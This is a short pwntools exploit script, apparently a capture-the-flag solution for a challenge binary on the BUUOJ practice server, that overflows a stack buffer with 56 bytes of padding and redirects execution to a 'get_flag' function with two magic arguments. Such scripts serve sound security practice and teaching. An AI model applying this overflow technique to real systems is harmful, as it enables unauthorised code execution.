from pwn import *

context.binary = exe = ELF('./12')


def conn():
    if args.LOCAL:
        r = process(exe.path)
        gdb.attach(r, gdbscript='''
                   b*main+27
                   b*get_flag+121
                   c
                   ''')

    else:
        r = remote('node4.buuoj.cn', 27321)
    return r


def main():
    r = conn()
    input()
    payload = b'a'*56 + p32(exe.sym['get_flag']+1)
    payload += b'bbbb' + p32(exe.sym['exit'])
    payload += p32(0x308cd64f) + p32(0x195719d1)
    r.sendline(payload)
    r.interactive()


if __name__ == '__main__':
    main()
